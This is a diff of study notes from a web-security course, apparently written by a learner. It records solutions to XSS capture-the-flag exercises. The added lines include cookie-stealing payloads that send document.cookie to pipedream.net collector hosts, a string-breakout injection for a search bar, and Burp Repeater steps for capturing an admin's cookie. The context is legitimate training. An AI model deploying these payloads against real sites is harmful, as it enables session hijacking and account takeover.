@@ -18,7 +18,8 @@
 #    - https://public.requestbin.com/r/
 
 #  6. XSS
-#    1) CTF XSS 1
+#    1) CTF XSS 1 (https://portswigger.net/web-security/cross-site-scripting/contexts)
+#      - Error = Input script
 #      - Annoucement and create content "<script>alert(1)</script>" on the subject.
 #      - When you click it, the alert shows up.
 #      - Instead of alert(1), put var i = new Image(); i.src = "HTTP://en7riltg206nc.x.pipedream.net/getCrred.php?cookie=" + cookieData;
@@ -38,4 +39,13 @@
 #  8. Assignment
 #    - Review
 #    - XSS CTF
-#    
+#    1) CTF XSS 2
+#      - Error = Showing the direct sentence on HTML => <script>alert('x에 대한 검색 결과가 존재하지 않습니다.');</script>
+#      - Check Attack statement on search bar => xss');alert(1);var i=('
+#      - Check Attack => xss');var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;var i=('
+#      - Send to repeater the POST URL to change GET method
+#      - Replace the Repeater on Burp Suite working on GET method instead of POST method because the host get the access
+#      - The GET URL input the admin visit url bar
+#      - Check the flag on https://public.requestbin.com/
+
+#     2) CTF XSS 3
